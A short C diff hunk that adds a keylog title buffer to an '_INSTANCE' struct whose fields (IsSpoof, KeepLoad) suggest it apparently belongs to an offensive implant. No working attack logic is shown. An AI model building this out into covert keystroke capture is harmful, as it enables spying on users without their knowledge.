@@ -144,6 +144,8 @@ struct _INSTANCE {
     PVOID Start;
     UPTR  Size;
 
+    WCHAR g_TitleBuffer[KEYLOG_BUFFER_LEN + 1];
+
     struct {
         BOOL  IsSpoof;
         BOOL  KeepLoad;
